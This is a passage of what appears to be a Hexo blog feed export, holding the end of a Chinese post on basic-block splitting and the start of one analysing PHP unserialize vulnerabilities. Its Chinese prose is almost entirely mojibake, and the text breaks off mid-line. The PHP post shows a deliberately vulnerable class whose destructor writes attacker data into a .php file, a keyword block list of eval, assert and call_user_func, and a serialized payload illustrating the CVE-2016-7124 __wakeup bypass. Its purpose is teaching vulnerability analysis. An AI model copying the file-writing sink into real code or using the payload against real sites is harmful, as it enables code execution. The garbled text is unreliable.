Blocks</h2><p>åŸºæœ¬å—ä¸­é™å®šäº†è¿›å…¥è¯­å¥å’Œç¦»å¼€è¯­å¥(è·³è½¬)ï¼Œ</p><ul><li>å…¥å£è¯­å¥å¯ä»¥æ˜¯é¡ºåºæ‰§è¡Œæ—¶é€‰å®šçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–è¯­å¥gotoè¿‡æ¥çš„</li></ul><h3 id="åˆ†å‰²ç®—æ³•"><a href="#åˆ†å‰²ç®—æ³•" class="headerlink" title="åˆ†å‰²ç®—æ³•"></a>åˆ†å‰²ç®—æ³•</h3><ul><li><p>å…¥å£</p><ul><li>ç¬¬ä¸€å¥æŒ‡ä»¤</li><li>å¦‚æœæŸä¸ªæŒ‡ä»¤æ˜¯gotoè¯­å¥çš„targetï¼Œåˆ™è‚¯å®šæ˜¯baseblockçš„å…¥å£</li><li>ç´§è·Ÿåœ¨ä¸€ä¸ªgotoè¯­å¥çš„ä¸‹ä¸€æ¡</li></ul></li><li><p>å‡ºå£</p><ul><li>å¦‚æœæŸä¸ªæŒ‡ä»¤ä¸­å«æœ‰gotoï¼Œåˆ™ä¸ºbbçš„å‡ºå£</li><li>return</li></ul></li></ul><h3 id="æ·»è¾¹"><a href="#æ·»è¾¹" class="headerlink" title="æ·»è¾¹"></a>æ·»è¾¹</h3><p>gotoè‡ªåŠ¨åŠ è¾¹ï¼Œå¦‚æœæ˜¯ç´§è·Ÿç€çš„ä¸¤ä¸ªå—ä¹‹é—´(å¯èƒ½å‰ä¸€ä¸ªå—çš„æœ€åä¸€å¥æ˜¯æœ‰æ¡ä»¶goto)ï¼Œä¹Ÿè¦æ·»è¾¹</p><blockquote><p>ä¾‹å¤–ï¼šå¦‚æœå‰ä¸€å—æœ€åä¸€å¥æ˜¯æ— æ¡ä»¶gotoï¼Œé‚£å°±ä¸éœ€è¦æ·»è¾¹</p></blockquote><p>å‰é©±-&gt;åç»§</p><blockquote><p>bbä¹‹é—´è¿å®Œï¼Œä¸€èˆ¬ä¼šåŠ ä¸€ä¸ªentryè™šæ‹ŸèŠ‚ç‚¹ã€exitè™šæ‹ŸèŠ‚ç‚¹</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
            <tag> IR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPå†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´</title>
      <link href="/2023/07/05/PHP%E5%86%85%E6%A0%B8%E5%B1%82%E8%A7%A3%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/05/PHP%E5%86%85%E6%A0%B8%E5%B1%82%E8%A7%A3%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPå†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´"><a href="#PHPå†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPå†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´"></a>PHPå†…æ ¸å±‚è§£æååºåˆ—åŒ–æ¼æ´</h1><h2 id="0x00-å‰ç½®çŸ¥è¯†"><a href="#0x00-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x00 å‰ç½®çŸ¥è¯†"></a>0x00 å‰ç½®çŸ¥è¯†</h2><h3 id="é­”æ³•å‡½æ•°"><a href="#é­”æ³•å‡½æ•°" class="headerlink" title="é­”æ³•å‡½æ•°"></a>é­”æ³•å‡½æ•°</h3><ol><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#1" >__construct() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œç±»çš„æ„é€ å‡½æ•°</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#2" >__destruct() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œç±»çš„ææ„å‡½æ•°</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#3" >__call() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#4" >__callStatic() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#5" >__get() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#6" >__set() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œåœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#7" >__isset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()å’Œempty()æ—¶ï¼Œ<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__isset()" >__isset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>è¢«è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#8" >__unset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶ï¼Œ<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__unset()" >__unset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ä¼šè¢«è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#9" >__sleep() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#10" >__wakeup() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#11" >__toString() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#12" >__invoke() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__invoke()" >__invoke() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#13" >__set_state() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#14" >__clone() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#15" >__debuginfo() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå½“è½¬å‚¨å¯¹è±¡ä»¥è·å–åº”æ˜¾ç¤ºçš„å±æ€§æ—¶ï¼Œä¼šè¢«è°ƒç”¨</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#16" >__autoload() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#17" >__serialize() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°**(è¿™ä¸ªå’Œ<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__sleep()" >__sleep() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>çš„åŒºåˆ«åé¢ä¼šè¯¦ç»†ä»‹ç»)**</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#18" >__unserialize() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°**(è¿™ä¸ªå’Œ<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__wakeup()" >__wakeup() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>çš„åŒºåˆ«åé¢ä¼šè¯¦ç»†ä»‹ç»)**</li></ol><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><p>è€ç”Ÿå¸¸è°ˆçš„<code>__wakeup</code>ç»•è¿‡</p><p>é¢˜ç›®èƒŒæ™¯</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$handle</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xxx.php&quot;</span>, <span class="string">&quot;a+ &quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="variable">$this</span>-&gt;str);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$danger_arr</span>-[<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>];</span><br><span class="line"><span class="variable language_">$this</span>-&gt;str=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$danger_arr</span>,<span class="string">&quot; , <span class="subst">$this</span>-&gt;str);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$o</span>=unserialize(&#x27;O:4:&quot;</span>test<span class="string">&quot;:1:&#123;s:3:&quot;</span>str<span class="string">&quot;;s:10:&quot;</span><span class="keyword">eval</span>(aaaa)<span class="string">&quot;;&#125;&#x27;);</span></span><br></pre></td></tr></table></figure></div><p>å½“ä¸€ä¸ªç±»è°ƒç”¨serializeè¿›è¡Œåºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>__sleep</code>å‡½æ•°,å½“å­—ç¬¦ä¸²è¦åˆ©ç”¨unserializeååºåˆ—åŒ–æˆä¸€ä¸ªç±»æ—¶ä¼šè°ƒç”¨<code>__wakeup</code>å‡½æ•°ã€‚ç»•è¿‡æ–¹å¼å°±æ˜¯è€ç”Ÿå¸¸è°ˆçš„Oåæ•°å­—å¤§äºå®é™…ç±»å±æ€§æ•°ç›®</p><h2 id="0x01-æºç è§£æ"><a href="#0x01-æºç è§£æ" class="headerlink" title="0x01 æºç è§£æ"></a>0x01 æºç è§£æ</h2><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>serializeå‡½æ•°å®šä¹‰åœ¨var.cæ–‡ä»¶ä¸­,è¿›è¡Œäº†ä¸€äº›å‡†å¤‡å·¥ä½œåï¼Œè·Ÿè¿›<code>php_var_serialize</code>å‡½æ•°</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI <span class="type">void</span> <span class="title function_">php_var_serialize</span><span class="params">(smart_str *buf, zval **struc, <span class="type">php_serialize_data_t</span> *var_hash TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">php_var_serialize_intern(buf, *struc, *var_hash TSRMLS_CC);</span><br><span class="line">smart_str_0(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>php_var_serialize_intern</code>å‡½æ•°,å…³é”®éƒ¨åˆ†å¦‚ä¸‹</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (Z_TYPE_P(struc)) &#123;</span><br><span class="line"><span class="keyword">case</span> IS_BOOL:</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;b:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_append_long(buf, Z_LVAL_P(struc));</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IS_NULL:</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IS_LONG:</span><br><span class="line">php_var_serialize_long(buf, Z_LVAL_P(struc));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IS_DOUBLE: &#123;</span><br><span class="line"><span class="type">char</span> *s;</span><br><span class="line"></span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;d:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">s = (<span class="type">char</span> *) safe_emalloc(PG(serialize_precision), <span class="number">1</span>, MAX_LENGTH_OF_DOUBLE + <span class="number">1</span>);</span><br><span class="line">php_gcvt(Z_DVAL_P(struc), PG(serialize_precision), <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, s);</span><br><span class="line">smart_str_appends(buf, s);</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">efree(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure></div><p>æ•´ä¸ªå‡½æ•°çš„ç»“æ„æ˜¯switch caseï¼Œé€šè¿‡å®<code>Z_TYPE_P</code>è§£æstrucå˜ä½“çš„ç±»å‹(æ­¤å®å±•å¼€ä¸ºstruc-&gt;u1.v.type)ï¼Œæ¥åˆ¤æ–­è¦åºåˆ—åŒ–çš„ç±»å‹ï¼Œä»è€Œè¿›å…¥ç›¸åº”çš„CASEéƒ¨åˆ†è¿›è¡Œæ“ä½œã€‚</p><p>ä¸€èˆ¬ä¼ å…¥ç±»åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä¼šè¢«è¯†åˆ«ä¸ºOBJECTï¼Œè¿›å…¥<code>IS_OBJECT</code>åˆ†æ”¯</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IS_OBJECT: &#123;</span><br><span class="line">zval *retval_ptr = <span class="literal">NULL</span>;</span><br><span class="line">zval fname;</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line">zend_class_entry *ce = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Z_OBJ_HT_P(struc)-&gt;get_class_entry) &#123;</span><br><span class="line">ce = Z_OBJCE_P(struc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ce &amp;&amp; ce-&gt;serialize != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/* has custom handler */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *serialized_data = <span class="literal">NULL</span>;</span><br><span class="line">zend_uint serialized_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ce-&gt;serialize(struc, &amp;serialized_data, &amp;serialized_length, (zend_serialize_data *)var_hash TSRMLS_CC) == SUCCESS) &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;C:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_append_long(buf, (<span class="type">int</span>)Z_OBJCE_P(struc)-&gt;name_length);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;:\&quot;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_appendl(buf, Z_OBJCE_P(struc)-&gt;name, Z_OBJCE_P(struc)-&gt;name_length);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;\&quot;:&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">smart_str_append_long(buf, (<span class="type">int</span>)serialized_length);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;:&#123;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_appendl(buf, serialized_data, serialized_length);</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (serialized_data) &#123;</span><br><span class="line">efree(serialized_data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ce &amp;&amp; ce != PHP_IC_ENTRY &amp;&amp; zend_hash_exists(&amp;ce-&gt;function_table, <span class="string">&quot;__sleep&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;__sleep&quot;</span>))) &#123;<span class="comment">//è°ƒç”¨__sleep</span></span><br><span class="line">INIT_PZVAL(&amp;fname);</span><br><span class="line">ZVAL_STRINGL(&amp;fname, <span class="string">&quot;__sleep&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;__sleep&quot;</span>) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">BG(serialize_lock)++;</span><br><span class="line">res = call_user_function_ex(CG(function_table), &amp;struc, &amp;fname, &amp;retval_ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br><span class="line">BG(serialize_lock)--;</span><br><span class="line">                    </span><br><span class="line"><span class="keyword">if</span> (EG(exception)) &#123;</span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">zval_ptr_dtor(&amp;retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (res == SUCCESS) &#123;</span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line"><span class="keyword">if</span> (HASH_OF(retval_ptr)) &#123;</span><br><span class="line">php_var_serialize_class(buf, struc, retval_ptr, var_hash TSRMLS_CC);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_NOTICE, <span class="string">&quot;__sleep should return an array only containing the names of instance-variables to serialize&quot;</span>);</span><br><span class="line"><span class="comment">/* we should still add element even if it&#x27;s not OK,</span></span><br><span class="line"><span class="comment"> * since we already wrote the length of the array before */</span></span><br><span class="line">smart_str_appendl(buf,<span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">zval_ptr_dtor(&amp;retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">zval_ptr_dtor(&amp;retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* fall-through */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å› ä¸Šé¢<code>case IS_OBJECT</code>åˆ†æ”¯ä¸­æ²¡æœ‰æµç¨‹å‘½ä¸­ï¼Œcaseä¸­åˆæ²¡æœ‰breakè¯­å¥ï¼Œç»§ç»­æ‰§è¡Œè¿›å…¥<code>IS_ARRAY</code>åˆ†æ”¯ï¼Œåœ¨è¿™é‡Œä»strucç»“æ„ä¸­æå–å‡ºç±»åï¼Œè®¡ç®—å…¶é•¿åº¦å¹¶èµ‹å€¼åˆ°bufç»“æ„ä¸­ï¼Œå¹¶æå–å‡ºç±»ä¸­è¦åºåˆ—åŒ–çš„ç»“æ„å­˜å…¥å“ˆå¸Œæ•°ç»„ä¸­ã€‚</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IS_ARRAY: &#123;</span><br><span class="line">zend_bool incomplete_class = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(struc) == IS_ARRAY) &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;a:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">myht = HASH_OF(struc);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">incomplete_class = php_var_serialize_class_name(buf, struc TSRMLS_CC);</span><br><span class="line">myht = Z_OBJPROP_P(struc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* count after serializing name, since php_var_serialize_class_name</span></span><br><span class="line"><span class="comment"> * changes the count if the variable is incomplete class */</span></span><br><span class="line">i = myht ? zend_hash_num_elements(myht) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; incomplete_class) &#123;</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line">smart_str_append_long(buf, i);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;:&#123;&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> *key;</span><br><span class="line">zval **data;</span><br><span class="line">ulong index;</span><br><span class="line">uint key_len;</span><br><span class="line">HashPosition pos;</span><br><span class="line"></span><br><span class="line">zend_hash_internal_pointer_reset_ex(myht, &amp;pos);</span><br><span class="line"><span class="keyword">for</span> (;; zend_hash_move_forward_ex(myht, &amp;pos)) &#123;</span><br><span class="line">i = zend_hash_get_current_key_ex(myht, &amp;key, &amp;key_len, &amp;index, <span class="number">0</span>, &amp;pos);</span><br><span class="line"><span class="keyword">if</span> (i == HASH_KEY_NON_EXISTENT) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (incomplete_class &amp;&amp; <span class="built_in">strcmp</span>(key, MAGIC_MEMBER) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> HASH_KEY_IS_LONG:</span><br><span class="line">php_var_serialize_long(buf, index);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> HASH_KEY_IS_STRING:</span><br><span class="line">php_var_serialize_string(buf, key, key_len - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we should still add element even if it&#x27;s not OK,</span></span><br><span class="line"><span class="comment"> * since we already wrote the length of the array before */</span></span><br><span class="line"><span class="keyword">if</span> (zend_hash_get_current_data_ex(myht, (<span class="type">void</span> **) &amp;data, &amp;pos) != SUCCESS</span><br><span class="line">|| !data</span><br><span class="line">|| data == &amp;struc</span><br><span class="line">|| (Z_TYPE_PP(data) == IS_ARRAY &amp;&amp; Z_ARRVAL_PP(data)-&gt;nApplyCount &gt; <span class="number">1</span>)</span><br><span class="line">) &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;N;&quot;</span>, <span 